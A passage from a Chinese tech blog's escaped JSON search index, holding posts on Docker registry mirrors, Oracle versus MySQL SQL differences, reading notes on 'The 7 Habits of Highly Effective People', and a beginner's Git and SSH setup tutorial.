\u003cspan class=\"s\"\u003e\u0026lt;\u0026lt;-\u0026#39;EOF\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  \u0026#34;registry-mirrors\u0026#34;: [\u0026#34;这里替换成自己的阿里云镜像加速器地址\u0026#34;]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo systemctl daemon-reload\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo systemctl restart docker\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"docker-cli\"\u003eDocker CLI\u003c/h2\u003e\n\u003cp\u003eCLI 是 Command-Line Interface （命令行界面）的缩写\n命令详情可以参考官方文档：\u003ca href=\"https://docs.docker.com/engine/reference/commandline/cli/\"\u003eDocker Reference Documentation\u003c/a\u003e\u003c/p\u003e","title":"Docker 实践及命令梳理"},{"content":"基本 Oracle默认端口：1521 默认用户：system MySQL默认端口：3306 默认用户：root\n连接MySQL：\nmysql -u root -p -- 输入密码 -- 查询所有数据库 show databases; -- 切换到 \u0026#34;test\u0026#34; 这个数据库 use test; -- 查询该数据库所有表 show tables; 连接Oracle：\nsqlplus -- 输入用户名 -- 输入密码 -- 查询该用户的表 select TABLE_NAME from user_tables; 注意：Oracle 登录需要授予登录用户 session权限，建表需要分配限额\n常用字段类型 Oracle 数值 number number(10) number(10,2) 字符串 varchar2 varchar2(20) 日期 date\nMySQL 数值 tinyint smallint mediumint int bigint decimal 字符串 varchar(10) 必须指定 日期 date time datetime timestamp year\nDML Oracle: create table t_student( sid int primary key , sname varchar2(10) not null , enterdate date, gender char(2), mail unique, age number check (age\u0026gt;19 and age\u0026lt;30) ) insert into t_student values(stuseq.nextval,\u0026#39;Test\u0026#39;,to_date(\u0026#39;1990-3-4\u0026#39;,\u0026#39;YYYY-MM-DD\u0026#39;),\u0026#39;男\u0026#39;,\u0026#39;1@outlook.com\u0026#39;,20); commit; ##　MySQL\ncreate table t_student( sid int primary key auto_increment, sname varchar(1) not null , enterdate date, gender char(1), age int, mail varchar(10) UNIQUE ) insert into t_student values(null,\u0026#39;Test\u0026#39;,\u0026#39;1990-3-4\u0026#39;,\u0026#39;男\u0026#39;,30,\u0026#39;2@outlook.com\u0026#39;) MySQL插入日期使用now() 或 sysdate()，可以插入多条，使用逗号隔开 删表数据：Oracle可以省略from：delete from t_student; (删除所有数据)\n外键约束：Oracle是constraints,MySQL是constraint\n级联操作：\nOracle：on delete set null 或者on delete cascade MySQL: on delete set null on update CASCADE 多表操作 Oracle：92语法：可以内连接，外连接99语法：可以内连接，外连接，全外连接(full join)\n-- SQL92 左外连接（保留左边, 注意(+)要放在右边，记忆：左外，右边会出现空行要+补齐） where e.department_id = d.department_id(+) -- MySQL：只支持内连接、外连接，并且只能用类似oracle中99语法的格式写，MySQL不完全符合SQL-92规范\nSQL 语句 MySQL 大小写不敏感(关键字和字段名都不区分)\n阿里巴巴Java开发手册，在MySQL建表规约里有： 【强制】表名、字段名必须使用小写字母或数字 ， 禁止出现数字开头，禁止两个下划线中间只出现数字。数据库字段名的修改代价很大，因为无法进行预发布，所以字段名称需要慎重考虑\nWindows 大小写不敏感，文件名同名大小写不同会覆盖\nMySQL 在 Windows 下不区分大小写，但在 Linux 下默认是区分大小写。因此，数据库名、 表名、字段名，都不允许出现任何大写字母，避免节外生枝 MySQL 的字段 大小写都可以查到\nOracle 是Oracle大小写不敏感的前提条件是在没有使用双引号 \u0026quot;\u0026quot; 的前提下（表名、字段名）\nCREATE TABLE \u0026ldquo;TableName\u0026rdquo;(\u0026ldquo;id\u0026rdquo; number); // 如果创建表的时候是这样写的，那么就必须严格区分大小写\nSELECT * FROM \u0026ldquo;TableName\u0026rdquo;; // 不仅要区分大小写而且要加双引号，以便和上面的第三种查询方式区分开 Oracle默认是大写，对字段的具体值是敏感的\n分页 Oracle：\n-- 利用rownum -- rownum从0开始 select * from (select rownum rr,stu.* from (select * from t_student order by sid desc) stu ) where rr\u0026gt;=1 and rr\u0026lt;=5; MySQL：\n-- 记录从0开始 -- 从第0条开始，取5条数据 select * from test2 order by sid desc limit 0,5 时间日期 Oracle Java中常用的 \u0026ldquo;yyyy-MM-dd mm:HH;ss\u0026rdquo; -\u0026gt; \u0026ldquo;2021-02-03 16:25:48\u0026rdquo; 在 Oracle 中的表示方式：\u0026lsquo;yyyy-mm-dd hh24:mi:ss\u0026rsquo;\nMySQL -- 获取当前时间戳 select unix_timestamp(); -- 1612340981 -- 获取当前日期时间 select now(); 2021-02-03 16:30:22 -- 获取当前日期 select date(now()); -- 2021-02-03 -- timestamp -\u0026gt; datetime select FROM_UNIXTIME(1612340981); -- 2021-02-03 16:29:41 -- datetime -\u0026gt; varchar (time与之类似：time_format(time,format)) select DATE_FORMAT(\u0026#39;2008-08-08 22:23:01\u0026#39;,\u0026#39;%Y %m %d %H %i %s\u0026#39;); -- 2008 08 08 22 23 01 -- varchar -\u0026gt; date str_to_date(str, format) select str_to_date(\u0026#39;08.09.2008 08:09:30\u0026#39;, \u0026#39;%m.%d.%Y %h:%i:%s\u0026#39;); -- 2008-08-09 08:09:30 Oracle Oracle DML 需要手动提交或回滚事务 DML(Data Manipulation Language): 数据操纵语言 针对表数据的增删改查 Oracle select 查询必须有from 所以可以用from dual（这是一张神奇的表）\n类型转换 date \u0026lt;\u0026ndash;\u0026gt; varchar2 \u0026lt;\u0026ndash;\u0026gt; number date \u0026ndash;\u0026gt; varchar2 : to_char(sysdate,\u0026lsquo;yyyy-mm-dd\u0026rsquo;) varchar2 \u0026ndash;\u0026gt; date : to_date(\u0026lsquo;2020-02-02\u0026rsquo;,\u0026lsquo;yyyy-mm-dd\u0026rsquo;)\nnumber \u0026ndash;\u0026gt; varchar2: to_char(1111111.11,\u0026lsquo;999,999,999\u0026rsquo;) \u0026ndash; 输出：1,111,111 使用'999,999,999\u0026rsquo;去匹配数字 varchar2 \u0026ndash;\u0026gt; number :to_number(\u0026rsquo;￥001,111,111\u0026rsquo;,\u0026lsquo;L000,000,000\u0026rsquo;) from dual; \u0026ndash; 输出：1111111\nL表示：当地的货币符号 字符串在运算时会自动隐式转换，含有非数字字符会报错：无效数字\n参考资料 mysql和oracle的区别 Oracle| Oracle大小写敏感问题 SQL连接标准 SQL92\\SQL99 MySQL 获得当前日期时间 函数\n","permalink":"https://aaronlinv.github.io/posts/oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AF%B9%E6%AF%94mysql/","summary":"\u003ch1 id=\"基本\"\u003e基本\u003c/h1\u003e\n\u003cp\u003eOracle默认端口：1521 默认用户：system\nMySQL默认端口：3306 默认用户：root\u003c/p\u003e\n\u003cp\u003e连接MySQL：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emysql -u root -p\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-- 输入密码\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-- 查询所有数据库\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eshow databases\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-- 切换到 \u003cspan class=\"s2\"\u003e\u0026#34;test\u0026#34;\u003c/span\u003e 这个数据库\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003euse test\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-- 查询该数据库所有表\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eshow tables\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e连接Oracle：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esqlplus\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-- 输入用户名\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-- 输入密码\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-- 查询该用户的表\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eselect\u003c/span\u003e TABLE_NAME from user_tables\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e注意：Oracle 登录需要授予登录用户 session权限，建表需要分配限额\u003c/p\u003e\n\u003ch1 id=\"常用字段类型\"\u003e常用字段类型\u003c/h1\u003e\n\u003cp\u003eOracle\n数值 number number(10) number(10,2)\n字符串 varchar2 varchar2(20)\n日期 date\u003c/p\u003e\n\u003cp\u003eMySQL\n数值 tinyint smallint mediumint int bigint decimal\n字符串 varchar(10)  必须指定\n日期 date time datetime timestamp year\u003c/p\u003e","title":"Oracle数据库对比MySQL"},{"content":"读完《高效能人士的七个习惯》，这本书中提到的很多内容引起了共鸣，我开始使用其中提到的一些习惯开始改变生活，并且这些习惯有在使我的生活更加积极高效。开始跳出自己，审视真实想法、动机、基本的思维方式并能够选择改变它们\n看到伐木工人伐木的例子，才恍然大悟，我们深陷技术框架中却不自知，忽视了训练一些更为重要的能力。只专注于那些紧急而重要的事情，却忽视那些不紧急而重要的事，疲于应对眼前的事，没有着眼于未来\n虽然书中提及了很多系统性的方法，但是要落实到行动中，还是有比较大的跨度，还是需要结合书中内容反复实践，从“积极主动”和“以终为始”做起，慢慢达到书中提及的7个习惯\n书中主要讲述了7个习惯，这7个习惯相互依赖，前3个习惯为个人领域，在个人领域实现成功后进入公共领域，获得更大的成功:\n积极主动 以终为始 要事第一 双赢思维 知彼解己 统合综效 不断更新 习惯一 积极主动 人类不仅能针对特定环境选择回应方式、更能主动创造有利环境。有两个很重要的概念，关注圈：每个格外关注的问题，影响圈：关注圈中可以掌控的事。积极的人，专注影响圈，做力所能及的事，扩大影响圈，使用积极回应（关注自己能改变的事情，能控制的事情）学会转型，放下往事、吸取教训并继续向前。不去埋怨外界，不把自己当成受害者，可以先从改变自己的消极语言开始，关注自己的回答是不是包含消极的情绪，刻意去改变它，尝试用积极的方式回应\n习惯二 以终为始 任何事物都需要两次创造：先在头脑中构思，即智力上或第一次的创造，然后付诸实践，即体力上或第二次创造。明确真正的目标很重要，然后才好勇往直前，坚持到底，践行使命。人会因为意外打击：亲人离世、罹患重病、经济危机、陷入危机的时候，我们会扪心自问：“到底什么才是真正重要的？我究竟在追求什么”。可以想象参加自己的葬礼，我们希望我们的家人、朋友认为我们是什么样的人，那我们现在就需要采取对应的行动，去不断趋近这个目标\n习惯三 要事第一 习惯三是习惯一和二的具体实践，别让琐事牵着鼻子走，时间管理矩阵（四象限）。偏重第一象限，应对各种问题，疲于奔命，只能借助第四象限的事物逃避现实、稍微放松一下；而将所有时间花在第三第四象限，是不负责任的生活，因为这些都不重要；完成第二象限事务，完成这些活动能提高个人处事能力\n第一代时间管理着重利用便条与备忘录，没有优先级概念，做完一件事固然会给人带来成就感，但是所做的是必要而非重要的事，组织纪律和备忘录让人有种错觉，就是他们不必对结果负责；第二代强调事历与日程表，反映出时间管理注意到了规划未来的重要；第三代根据轻重缓急设定短、中、长期目标，再逐日指定目标，将有限的精力和时间加以分配，争取最高的效率，这种方式过分强调效率，把时间崩得死死的，使人失去增进感情、满足个人需求以及享受意外惊喜的机会。而第四代：以原则为中心，配合个人对使命的认知，兼顾重要性和急迫性，强调产出与产能齐头并进，着重第二象限事物的完成\n人际关系的本质： 缺乏独立人格，却一味玩弄人际关系的技巧，纵使得逞一时，也不过是运气罢了。处顺境至终还可任你为所欲为，但天有不测风云，一旦面临逆境，技巧便不可靠\n牢记一点：速战速决是不切实际的，建立和维护关系都需要时间，建立并维持人际关系是一种长期的投资行为\n情感账户投资方式：\n理解他人：（换位思考，将心比心） 注意小节：（礼貌，不经意的失言） 信守承诺：（不轻易许诺，许过就一定要兑现） 明确期望：（一开始就提出明确的期望，让相关的每个人都了解，要做到这一点需要投入很多的时间和精力，这样会省去你将来更多的麻烦和周折） 正值诚信：避免背后攻击他人 勇于致歉：（但是一再道歉就显得不真诚） 无条件的爱：无条件的爱可以给人安全感与自信心，鼓励个人肯定自我。有条件的爱，往往会引起被爱者的反抗心理，为证明自己的独立，不惜为反对而反 习惯四 双赢思维 长远来看，不是双赢，就一定两败俱伤，只有双赢才是在相互依赖的环境中唯一可行的交往模式，不能双赢就好聚好散（放弃交易）。心中里有退路，顿觉轻松无比，更不必耍手段、施压力，迫使对方就范。坦诚相见，更有助于发掘及解决问题。即使买卖不成，仁义尚在，或许日后还有合作的机会\n习惯五 知彼解己 如果你要和我交往，想对我有影响力，你首先要了解我，而做到这一点不能只靠技巧。如果我觉察到你在使用某些技巧，就会有受骗和被操纵的感觉。我不知道你为什么这样做，有什么动机。你让我没有安全感，自然也不会对你敞开心扉。移情聆听本质不是要你赞同对方，而是要在情感和理智上充分而深入地理解对方。当你清晰、具体地表达想法，最为重要的是，在理解别人思路和担忧的前提下表达，那么可信度会大大增加。在沟通的时候，我们应该先怀着理解对方的想法去聆听，不要一味想着如何回答，将心比心站在对方的角度上，思考如何回答，再争取让别人了解自己的看法\n四种自传式回应\n价值判断\u0026ndash;对旁人的意见只接受或不接受 追根究底\u0026ndash; 依自己的价值观探查别人的隐私 好为人师\u0026ndash;以自己的经验提供忠告 自以为是\u0026ndash;根据自己的行为与动机衡量别人的行为与动机 习惯六 统合综效 \u0026ndash; 创造性合作的原则 如果一位具有相当聪明才智的人跟我意见不同，那么对方的主张必定有我尚未体会的奥妙，值得加以了解\n沟通层次：\n相互提防（赢/输或输/赢模式） 互相尊重（妥协） 统合综效（双赢） 在与他人合作时我们要尊重差异：与人合作最重要的是，重视不同个体的不同心理、情绪与智能，以及个人眼中所见到的不同世界。即使处于不利境地，也不应该放弃追求统合综效。不要在意别人的无礼行径，避开那些消极力量，发现并利用别人的优势，提高自己的认识，拓展自己的视野。你应该在相互依赖的环境中勇敢而坦率第表达自己的观点、情感和经历，借此鼓励他人同样地坦诚相待。尊重人与人之间的差异，当有人不同意你的观点的时候，你应该说：“你跟我有不一样的看法，这很好”，你不一定要对他们表示赞同，但是你可以表示肯定，并尽量给予理解。如果你坚持双赢，确实愿意努力理解对方，你就能找到一种让每一个人都收益的解决方案\n变得统合综效：\n定义问题或机会 他们的方式（首先试着理解别人的想法） 我的方式（试着通过分享获得理解） 头脑风暴（创造新的机遇和想法） 快速通道（找到最佳解决方案） 习惯七 不断更新 \u0026ndash; 平衡的自我提升原则 假使你在森林中 看到一名伐木工人，为了锯一棵树已幸苦了5个小时，筋疲力竭却进展有限，你当然会建议他：“为什么不暂停几分钟，把锯子磨得更锋利？”，对方却回答：“我没空，锯树都来不及，哪有时间磨锯子”\n自我提升和完善的四个层面：身体、精神、智力、社会/情感\n身体：健康饮食、充足休息、定期锻炼 精神：人的本质、核心和对价值体系的坚持 智力层面：一旦脱离了学校的训导，许多人的头脑就会退化：不再认真读书，不再探索身外的新世界，不再用心思考，也不再写作，至少不再重视写作 智力层面的更新主要靠教育、借此不断学习知识，磨砺心智，开拓视野 定期阅读优秀文学作品 也是拓展思维的最佳方式 磨练心智的另一种有效方式的写作。通过不断记录自己的想法、经历、深刻见解和学习心得，我们的思路就会更加清晰、准确和连贯 社会/情感：围绕着人际关系、移情交流和创造性合作的原则 ","permalink":"https://aaronlinv.github.io/posts/%E9%AB%98%E6%95%88%E8%83%BD%E4%BA%BA%E5%A3%AB%E7%9A%84%E4%B8%83%E4%B8%AA%E4%B9%A0%E6%83%AF%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/","summary":"\u003cp\u003e读完\u003ca href=\"https://book.douban.com/subject/5325618/\"\u003e《高效能人士的七个习惯》\u003c/a\u003e，这本书中提到的很多内容引起了共鸣，我开始使用其中提到的一些习惯开始改变生活，并且这些习惯有在使我的生活更加积极高效。开始跳出自己，审视真实想法、动机、基本的思维方式并能够选择改变它们\u003c/p\u003e\n\u003cp\u003e看到伐木工人伐木的例子，才恍然大悟，我们深陷技术框架中却不自知，忽视了训练一些更为重要的能力。只专注于那些紧急而重要的事情，却忽视那些不紧急而重要的事，疲于应对眼前的事，没有着眼于未来\u003c/p\u003e\n\u003cp\u003e虽然书中提及了很多系统性的方法，但是要落实到行动中，还是有比较大的跨度，还是需要结合书中内容反复实践，从“积极主动”和“以终为始”做起，慢慢达到书中提及的7个习惯\u003c/p\u003e\n\u003cp\u003e书中主要讲述了7个习惯，这7个习惯相互依赖，前3个习惯为个人领域，在个人领域实现成功后进入公共领域，获得更大的成功:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e积极主动\u003c/li\u003e\n\u003cli\u003e以终为始\u003c/li\u003e\n\u003cli\u003e要事第一\u003c/li\u003e\n\u003cli\u003e双赢思维\u003c/li\u003e\n\u003cli\u003e知彼解己\u003c/li\u003e\n\u003cli\u003e统合综效\u003c/li\u003e\n\u003cli\u003e不断更新\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"习惯一-积极主动\"\u003e习惯一 积极主动\u003c/h3\u003e\n\u003cp\u003e人类不仅能针对特定环境选择回应方式、更能主动创造有利环境。有两个很重要的概念，关注圈：每个格外关注的问题，影响圈：关注圈中可以掌控的事。积极的人，专注影响圈，做力所能及的事，扩大影响圈，使用积极回应（关注自己能改变的事情，能控制的事情）学会转型，放下往事、吸取教训并继续向前。不去埋怨外界，不把自己当成受害者，可以先从改变自己的消极语言开始，关注自己的回答是不是包含消极的情绪，刻意去改变它，尝试用积极的方式回应\u003c/p\u003e\n\u003ch3 id=\"习惯二-以终为始\"\u003e习惯二 以终为始\u003c/h3\u003e\n\u003cp\u003e任何事物都需要两次创造：先在头脑中构思，即智力上或第一次的创造，然后付诸实践，即体力上或第二次创造。明确真正的目标很重要，然后才好勇往直前，坚持到底，践行使命。人会因为意外打击：亲人离世、罹患重病、经济危机、陷入危机的时候，我们会扪心自问：“到底什么才是真正重要的？我究竟在追求什么”。可以想象参加自己的葬礼，我们希望我们的家人、朋友认为我们是什么样的人，那我们现在就需要采取对应的行动，去不断趋近这个目标\u003c/p\u003e\n\u003ch3 id=\"习惯三-要事第一\"\u003e习惯三 要事第一\u003c/h3\u003e\n\u003cp\u003e习惯三是习惯一和二的具体实践，别让琐事牵着鼻子走，时间管理矩阵（四象限）。偏重第一象限，应对各种问题，疲于奔命，只能借助第四象限的事物逃避现实、稍微放松一下；而将所有时间花在第三第四象限，是不负责任的生活，因为这些都不重要；完成第二象限事务，完成这些活动能提高个人处事能力\u003c/p\u003e\n\u003cp\u003e第一代时间管理着重利用便条与备忘录，没有优先级概念，做完一件事固然会给人带来成就感，但是所做的是必要而非重要的事，组织纪律和备忘录让人有种错觉，就是他们不必对结果负责；第二代强调事历与日程表，反映出时间管理注意到了规划未来的重要；第三代根据轻重缓急设定短、中、长期目标，再逐日指定目标，将有限的精力和时间加以分配，争取最高的效率，这种方式过分强调效率，把时间崩得死死的，使人失去增进感情、满足个人需求以及享受意外惊喜的机会。而第四代：以原则为中心，配合个人对使命的认知，兼顾重要性和急迫性，强调产出与产能齐头并进，着重第二象限事物的完成\u003c/p\u003e\n\u003ch3 id=\"人际关系的本质\"\u003e人际关系的本质：\u003c/h3\u003e\n\u003cp\u003e缺乏独立人格，却一味玩弄人际关系的技巧，纵使得逞一时，也不过是运气罢了。处顺境至终还可任你为所欲为，但天有不测风云，一旦面临逆境，技巧便不可靠\u003c/p\u003e\n\u003cp\u003e牢记一点：速战速决是不切实际的，建立和维护关系都需要时间，建立并维持人际关系是一种长期的投资行为\u003c/p\u003e\n\u003cp\u003e情感账户投资方式：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e理解他人：（换位思考，将心比心）\u003c/li\u003e\n\u003cli\u003e注意小节：（礼貌，不经意的失言）\u003c/li\u003e\n\u003cli\u003e信守承诺：（不轻易许诺，许过就一定要兑现）\u003c/li\u003e\n\u003cli\u003e明确期望：（一开始就提出明确的期望，让相关的每个人都了解，要做到这一点需要投入很多的时间和精力，这样会省去你将来更多的麻烦和周折）\u003c/li\u003e\n\u003cli\u003e正值诚信：避免背后攻击他人\u003c/li\u003e\n\u003cli\u003e勇于致歉：（但是一再道歉就显得不真诚）\u003c/li\u003e\n\u003cli\u003e无条件的爱：无条件的爱可以给人安全感与自信心，鼓励个人肯定自我。有条件的爱，往往会引起被爱者的反抗心理，为证明自己的独立，不惜为反对而反\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"习惯四-双赢思维\"\u003e习惯四 双赢思维\u003c/h3\u003e\n\u003cp\u003e长远来看，不是双赢，就一定两败俱伤，只有双赢才是在相互依赖的环境中唯一可行的交往模式，不能双赢就好聚好散（放弃交易）。心中里有退路，顿觉轻松无比，更不必耍手段、施压力，迫使对方就范。坦诚相见，更有助于发掘及解决问题。即使买卖不成，仁义尚在，或许日后还有合作的机会\u003c/p\u003e\n\u003ch3 id=\"习惯五-知彼解己\"\u003e习惯五 知彼解己\u003c/h3\u003e\n\u003cp\u003e如果你要和我交往，想对我有影响力，你首先要了解我，而做到这一点不能只靠技巧。如果我觉察到你在使用某些技巧，就会有受骗和被操纵的感觉。我不知道你为什么这样做，有什么动机。你让我没有安全感，自然也不会对你敞开心扉。移情聆听本质不是要你赞同对方，而是要在情感和理智上充分而深入地理解对方。当你清晰、具体地表达想法，最为重要的是，在理解别人思路和担忧的前提下表达，那么可信度会大大增加。在沟通的时候，我们应该先怀着理解对方的想法去聆听，不要一味想着如何回答，将心比心站在对方的角度上，思考如何回答，再争取让别人了解自己的看法\u003c/p\u003e\n\u003cp\u003e四种自传式回应\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e价值判断\u0026ndash;对旁人的意见只接受或不接受\u003c/li\u003e\n\u003cli\u003e追根究底\u0026ndash; 依自己的价值观探查别人的隐私\u003c/li\u003e\n\u003cli\u003e好为人师\u0026ndash;以自己的经验提供忠告\u003c/li\u003e\n\u003cli\u003e自以为是\u0026ndash;根据自己的行为与动机衡量别人的行为与动机\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"习惯六-统合综效--创造性合作的原则\"\u003e习惯六 统合综效 \u0026ndash; 创造性合作的原则\u003c/h3\u003e\n\u003cp\u003e如果一位具有相当聪明才智的人跟我意见不同，那么对方的主张必定有我尚未体会的奥妙，值得加以了解\u003c/p\u003e\n\u003cp\u003e沟通层次：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e相互提防（赢/输或输/赢模式）\u003c/li\u003e\n\u003cli\u003e互相尊重（妥协）\u003c/li\u003e\n\u003cli\u003e统合综效（双赢）\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e在与他人合作时我们要尊重差异：与人合作最重要的是，重视不同个体的不同心理、情绪与智能，以及个人眼中所见到的不同世界。即使处于不利境地，也不应该放弃追求统合综效。不要在意别人的无礼行径，避开那些消极力量，发现并利用别人的优势，提高自己的认识，拓展自己的视野。你应该在相互依赖的环境中勇敢而坦率第表达自己的观点、情感和经历，借此鼓励他人同样地坦诚相待。尊重人与人之间的差异，当有人不同意你的观点的时候，你应该说：“你跟我有不一样的看法，这很好”，你不一定要对他们表示赞同，但是你可以表示肯定，并尽量给予理解。如果你坚持双赢，确实愿意努力理解对方，你就能找到一种让每一个人都收益的解决方案\u003c/p\u003e\n\u003cp\u003e变得统合综效：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e定义问题或机会\u003c/li\u003e\n\u003cli\u003e他们的方式（首先试着理解别人的想法）\u003c/li\u003e\n\u003cli\u003e我的方式（试着通过分享获得理解）\u003c/li\u003e\n\u003cli\u003e头脑风暴（创造新的机遇和想法）\u003c/li\u003e\n\u003cli\u003e快速通道（找到最佳解决方案）\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"习惯七-不断更新--平衡的自我提升原则\"\u003e习惯七 不断更新 \u0026ndash; 平衡的自我提升原则\u003c/h3\u003e\n\u003cp\u003e假使你在森林中 看到一名伐木工人，为了锯一棵树已幸苦了5个小时，筋疲力竭却进展有限，你当然会建议他：“为什么不暂停几分钟，把锯子磨得更锋利？”，对方却回答：“我没空，锯树都来不及，哪有时间磨锯子”\u003c/p\u003e\n\u003cp\u003e自我提升和完善的四个层面：身体、精神、智力、社会/情感\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e身体：健康饮食、充足休息、定期锻炼\u003c/li\u003e\n\u003cli\u003e精神：人的本质、核心和对价值体系的坚持\u003c/li\u003e\n\u003cli\u003e智力层面：一旦脱离了学校的训导，许多人的头脑就会退化：不再认真读书，不再探索身外的新世界，不再用心思考，也不再写作，至少不再重视写作\n智力层面的更新主要靠教育、借此不断学习知识，磨砺心智，开拓视野\n定期阅读优秀文学作品 也是拓展思维的最佳方式\n磨练心智的另一种有效方式的写作。通过不断记录自己的想法、经历、深刻见解和学习心得，我们的思路就会更加清晰、准确和连贯\u003c/li\u003e\n\u003cli\u003e社会/情感：围绕着人际关系、移情交流和创造性合作的原则\u003c/li\u003e\n\u003c/ol\u003e","title":"《高效能人士的七个习惯》读书笔记"},{"content":"学习建议 廖雪峰Git教程 比较详细，可操作性也比较强，在评论区可以找到勘误 Git官方推荐的《Pro Git》也很不错，推荐掌握了一定Git基础后再看 对于没有 Linux 基础，或者文字版学起来比较困难的朋友可以看系列视频教程 互联网人都该懂点 Git Linux 下最常用的编辑器就是 Vim，然而第一用可能会让你怀疑人生，建议先学习一下 ：使用Vim创建和编辑文本文件\n注意点 Git 2.23 (2019.8.16) git checkout 这个命令被拆分成了两个新命令：git switch 和 git restore 创建并切换到dev分支：git checkout -b dev 现在用git switch -c dev 效果相同\n初始配置 安装Git Bash后需要做初始配置\n用户名邮箱 # 任意文件夹右键 点击“ Git Bash Here ” # \u0026#34;\u0026#34;内替换为自己的用户名和邮箱 git config --global user.name \u0026#34;username\u0026#34; git config --global user.email \u0026#34;email\u0026#34; # 查看配置是否成功 git config user.name git config user.email SSH 免密登录 # ssh-keygen 用于生成，管理和转换身份验证密钥 # -t：密钥的类型 # -C：用于识别这个密钥的注释（不添加注释直接ssh-keygen -t rsa也不影响使用） ssh-keygen -t rsa -C \u0026#34;邮箱地址\u0026#34; # 连续按3次回车 # 将用户目录下.ssh文件夹内的id_rsa.pub的内容粘贴到GitHub的SSH Keys中 # 具体位置：GitHub Settings -\u0026gt; SSH and GPG keys -\u0026gt; SSH keys # 测试是否成功 Github # 码云测试命令为：ssh git@gitee.com 反馈的结果与 GitHub 类似 ssh git@github.com # Are you sure you want to continue connecting (yes/no)? # 这时需要输入：yes #成功会提示成功认证你的账户 # Hi aaronlinv! You\u0026#39;ve successfully authenticated, but GitHub does not provide shell access. # Connection to github.com closed. 场景0：Git 基本使用 # 新建文件夹，初始化为Git仓库 mkdir learn-git cd learn-git git init # 在当前目录添加并编辑文件(不熟悉 vim 编辑器可以用其他编辑器新建文件并编辑文件 ) vim test.txt # 查看文件状态 test.txt现在为Untracked状态 git status # 添加文件到暂存区 git add test.txt # 提交commit -m 代表添加一个“提交信息” git commit -m \u0026#34;add test.txt\u0026#34; # 推送到 GitHub（在 GitHub 上创建空白仓库，并复制仓库地址） # \u0026#34;git@github.com:aaronlinv/learn-git.git\u0026#34; 需要替换为自己新建的仓库地址 # 先添加远端仓库 # origin：远端仓库的别名（默认origin） git remote add origin git@github.com:aaronlinv/learn-git.git # 查看远端操作（会显示 fetch和push） git remote -v # 推送到远端仓库（使用SSH协议需要配置SSH免密登录） git push -u origin master # -u：指定默认远端仓库别名，下一次推送只需使用git push # origin：远端仓库的别名（默认origin） # master：分支名称 push 是可能会遇到报错：refusing to merge unrelated histories 原因是远程仓库和本地仓库做了不同的改变并commit，导致本地仓库和远程仓库变成了独立的两个仓库，所以不能直接合并，执行以下命令合并代码，再push即可\ngit pull origin master --allow-unrelated-histories 